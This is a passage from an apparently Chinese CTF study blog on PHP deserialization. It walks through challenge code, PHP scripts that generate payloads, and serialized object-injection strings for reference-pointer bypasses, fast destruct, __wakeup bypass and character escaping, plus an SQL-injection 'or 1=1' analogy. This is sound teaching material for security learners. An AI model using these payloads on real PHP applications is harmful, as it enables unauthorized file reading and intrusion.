class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="variable language_">$this</span>-&gt;correct = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">uniqid</span>());</span><br><span class="line">           <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;correct === <span class="variable language_">$this</span>-&gt;input) &#123;</span><br><span class="line">               <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pleaseget&#x27;</span>] === <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pleasepost&#x27;</span>] === <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>]) == <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;md51&#x27;</span>] != <span class="variable">$_POST</span>[<span class="string">&#x27;md52&#x27;</span>]) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>传入时存在一个弱类型的比较 用数组即可绕过</p>
<p>在BUU类中存在一个uniqid()函数 以微秒级生成标识 每时每刻都在改变，所以我们没办法确定input的值传入 而是通过指针的方法调用correct的值进行绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BUU</span> </span>&#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$correct</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">   <span class="keyword">public</span> <span class="variable">$input</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public function __destruct() &#123;</span></span><br><span class="line"><span class="comment">//        try &#123;</span></span><br><span class="line"><span class="comment">//            $this-&gt;correct = base64_encode(uniqid());</span></span><br><span class="line"><span class="comment">//            if($this-&gt;correct === $this-&gt;input) &#123;</span></span><br><span class="line"><span class="comment">//                echo file_get_contents(&quot;/flag&quot;);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125; catch (Exception $e) &#123;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> BUU;</span><br><span class="line"><span class="variable">$a</span> -&gt; input = &amp;<span class="variable">$a</span> -&gt; correct;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure>

<p>生成payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">3</span>:<span class="string">&quot;BUU&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;correct&quot;</span>;s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;input&quot;</span>;R:<span class="number">2</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/.com//17476565097171150640440786115888-20250519200830-rrjxtqt.png" alt="17476565097171150640440786115888"></p>
<h2 id="例题2：2020蓝帽杯"><a href="#例题2：2020蓝帽杯" class="headerlink" title="例题2：2020蓝帽杯"></a>例题2：2020蓝帽杯</h2><h5 id="题目：-2"><a href="#题目：-2" class="headerlink" title="题目："></a>题目：</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Seri</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$alize</span>;</span><br><span class="line">    <span class="comment">// public function __construct($alize) &#123;</span></span><br><span class="line">    <span class="comment">//     $this-&gt;alize = $alize;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;alize-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Another construction!!&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;f = <span class="variable">$file</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;t1 = <span class="variable language_">$this</span>-&gt;t2 = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;t2 = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;t1;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;t2;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;t1 === <span class="variable language_">$this</span>-&gt;t2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;f))&#123;</span><br><span class="line">                <span class="keyword">echo</span> @<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;f,<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;niubi&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$p</span>)) &#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$p</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="comment">// echo &quot;NONONO&quot;;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $a = new Seri;</span></span><br><span class="line"><span class="comment">// $b = new Flag;  注意使用该语句生成payload的时候要把本地的方法禁用</span></span><br><span class="line"><span class="comment">// $a -&gt; alize = $b;</span></span><br><span class="line"><span class="comment">// $b -&gt; t1 = &amp;$b -&gt; t2; </span></span><br><span class="line"><span class="comment">// $b -&gt; f = &#x27;flag.php&#x27;;</span></span><br><span class="line"><span class="comment">// echo serialize($a);</span></span><br></pre></td></tr></table></figure>

<p><img src="/.com//17476565317604900775680869431296-20250519200852-08dr7rx.png" alt="17476565317604900775680869431296"></p>
<p>但是本道题因为是rand函数 随机生成的范围有限</p>
<p>所以可以随意设置一个范围内的数字 然后通过bp进行爆破</p>
<hr>
<h1 id="畸形序列化字符串"><a href="#畸形序列化字符串" class="headerlink" title="畸形序列化字符串"></a>畸形序列化字符串</h1><h4 id="应用领域"><a href="#应用领域" class="headerlink" title="应用领域"></a>应用领域</h4><ol>
<li>绕过__wakeup（）</li>
<li>fast destruct快速析构</li>
</ol>
<h5 id="wakeup绕过"><a href="#wakeup绕过" class="headerlink" title="wakeup绕过"></a>wakeup绕过</h5><p>在老版本的php中对序列化的结果的对象属性值+n</p>
<h5 id="fast-destruct"><a href="#fast-destruct" class="headerlink" title="fast destruct"></a>fast destruct</h5><p>类需要利用析构方法进行某种操作（帮助你去拿flag），但是在析构之前会调用一些方法进行过滤或干扰，常见的出题形式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line"><span class="variable">$obj</span> -&gt; <span class="title function_ invoke__">safe_filter</span>();    <span class="comment">//调用一个进行安全检查的方法</span></span><br></pre></td></tr></table></figure>

<p><strong>快速析构的原理：</strong></p>
<p>当php接收到畸形序列化字符串时，PHP由于其容错机制，依然可以反序列化成功；</p>
<p>但是由于给的是一个畸形的反序列化字符串，是不标准的，php对这个畸形序列化字符串得到的<strong>对象</strong>不放心，会赶紧把该<strong>对象</strong>清除掉，就会触发其析构方法。</p>
<p>这样就会提前触发析构方法，不需要等到所用语句都执行结束，也就可以避免一些安全检查方法的调用。</p>
<hr>
<h1 id="0708反序列化字符逃逸"><a href="#0708反序列化字符逃逸" class="headerlink" title="0708反序列化字符逃逸"></a>0708反序列化字符逃逸</h1><h3 id="开篇例题："><a href="#开篇例题：" class="headerlink" title="开篇例题："></a>开篇例题：</h3><h4 id="题目：-3"><a href="#题目：-3" class="headerlink" title="题目："></a>题目：</h4><p><a target="_blank" rel="noopener" href="http://122.114.252.87:2030/">http://122.114.252.87:2030/</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;index.php&quot;</span>);</span><br><span class="line"><span class="comment">//函数作用：把0*0 替换为\0\0\0  因为后面这个内容是在单引号里面包裹 所以斜杠就是斜杠  但是如果在双引号里面包裹就会变成转义字符</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//关键所在这里的替换字符数不等长  3到6字符的替换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="string">&#x27;\0\0\0&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">//6到3字符的替换</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\0\0\0&#x27;</span>, <span class="title function_ invoke__">chr</span>(<span class="number">0</span>) . <span class="string">&#x27;*&#x27;</span> . <span class="title function_ invoke__">chr</span>(<span class="number">0</span>), <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="string">&#x27;hello&#x27;</span>.<span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//flag.php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;c);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;nice&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//关于read和write函数 如果可以保证外层替换的字符串存在  内层的不存在  就可以只触发外层函数</span></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">read</span>(<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>)))); </span><br></pre></td></tr></table></figure>

<p>对于双引号和单引号的测试如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php -a   <span class="comment">//直接在cmd中输入 会启动php</span></span><br><span class="line"></span><br><span class="line">php &gt; <span class="keyword">echo</span> <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">\n               <span class="comment">//单引号是什么就输出什么</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                <span class="comment">//转义后只有换行</span></span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure>

<p>类比sql注入中的逃逸</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users where u=<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> p=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">//进行逃逸</span></span><br><span class="line">select * <span class="keyword">from</span> users where u=<span class="string">&#x27;\&#x27; and p=&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="string">&#x27;  //单引号会被转义掉</span></span><br><span class="line"><span class="string">=&gt; select * from users where u=&#x27;</span> <span class="keyword">and</span> p=<span class="string">&#x27; or 1=1&#x27;</span></span><br></pre></td></tr></table></figure>

<h4 id="本质："><a href="#本质：" class="headerlink" title="本质："></a>本质：</h4><p>对序列化字符串进行不等长的字符串替换，导致本来属于普通字符串的一部分字符串变成了序列化的一部分，或者导致本来不属于字符串的一部分变成了字符串的一部分，进而造成了序列化数据的错乱，导致了对象注入。</p>
<h4 id="解题：-1"><a href="#解题：-1" class="headerlink" title="解题："></a>解题：</h4><p>获取A的序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;UN&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&quot;PW&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> A)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;UN&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;PW&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>获取BC的序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span> = <span class="string">&#x27;world&#x27;</span>;</span><br><span class="line">    <span class="comment">// function __destruct()&#123;</span></span><br><span class="line">    <span class="comment">//      字符串的拼接触发toString </span></span><br><span class="line">    <span class="comment">//      $c = &#x27;hello&#x27;.$this-&gt;b;</span></span><br><span class="line">    <span class="comment">//     //echo类的对象会触发toString方法</span></span><br><span class="line">    <span class="comment">//     echo $c;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="comment">// function __toString()&#123;</span></span><br><span class="line">    <span class="comment">//     //flag.php</span></span><br><span class="line">    <span class="comment">//     echo file_get_contents($this-&gt;c);</span></span><br><span class="line">    <span class="comment">//     return &#x27;nice&#x27;;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"><span class="variable">$b</span> -&gt; b = <span class="variable">$c</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>接下来需要把BC读取flag的序列化结果填入到A中</p>
<p>首先对于序列化的属性进行讲解：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;i:<span class="number">0</span>;s:<span class="number">6</span>:<span class="string">&quot;张三&quot;</span>;i:<span class="number">1</span>;s:<span class="number">6</span>:<span class="string">&quot;李四&quot;</span>;i:<span class="number">2</span>;i:<span class="number">18</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>简单说明下序列化字符串</p>
<p>a:3 ——&gt; 代表集合中有3个元素，a则是array类型（o则是object，s则是string，i则是integer等等）</p>
<p>i:0;s:6:”张三” ——&gt; i:0则是第一个元素，s:6则是string，字符串长度为6，元素是张三</p>
<p>i:2;i:18 ——&gt; i:2则是第三个元素，i:18则是int，整数不计算长度，元素是18</p>
<blockquote>
<p>a – array<br>b – boolean<br>d – double<br>i – integer<br>o – common object<br>r – reference<br>s – string<br>C – custom object<br>O – class<br>N – null<br>R – pointer reference<br>U – unicode string<br>N 表示的是 NULL</p>
</blockquote>
<p>所以把我们生成的两个序列化放到一起研究如何利用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;UN&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;PW&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">object</span> 一个 为A类 中有两个成员 </span><br><span class="line">    第一个是<span class="keyword">string</span>型 长度为<span class="number">8</span> 名为username 其值为<span class="keyword">string</span>型长度为<span class="number">2</span> 值为UN </span><br><span class="line">    第二个是<span class="keyword">string</span>型 长度为<span class="number">8</span> 名为password 其值为<span class="keyword">string</span>型长度为<span class="number">2</span> 值为PW</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;B&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;b&quot;</span>;O:<span class="number">1</span>:<span class="string">&quot;C&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">1</span>:<span class="string">&quot;c&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;&#125;</span><br><span class="line"><span class="keyword">object</span> 一个 为B类 中有一个成员</span><br><span class="line">    第一个为<span class="keyword">string</span>型 长度为<span class="number">1</span> 名为b </span><br><span class="line">    其值为<span class="keyword">object</span>型 一个 值为C 其中包含一个成员 <span class="keyword">string</span>型 名为c 其值为<span class="keyword">string</span>型长度为<span class="number">8</span> 值为flag.php</span><br></pre></td></tr></table></figure>

<p>拼接：BC 填入到 A中 因为函数执行的是A的对象 把PW给删了 分号结尾</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">2</span>:&#123;属性s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>;属性的值s:<span class="number">2</span>:<span class="string">&quot;UN&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot; 补一个分号结尾;这些全部吃掉 把password约束吃掉的结果 作为username的值  这里缺少属性 补一个 属性s:8:&quot;</span>password<span class="string">&quot;;属性的值（object型）O:1:&quot;</span>B<span class="string">&quot;:1:&#123;s:1:&quot;</span>b<span class="string">&quot;;O:1:&quot;</span>C<span class="string">&quot;:1:&#123;s:1:&quot;</span>c<span class="string">&quot;;s:8:&quot;</span>flag.php<span class="string">&quot;;&#125;&#125; 这里的两个符号&quot;</span>;也多余了 补充保证格式正确s:<span class="number">0</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">0</span><span class="string">&quot;&quot;</span>; &#125;</span><br></pre></td></tr></table></figure>

<p>添加到PW的位置后我们发现 一个双引号后面直接来了个O有些突兀</p>
<p>直接放到函数中进行生成</p>
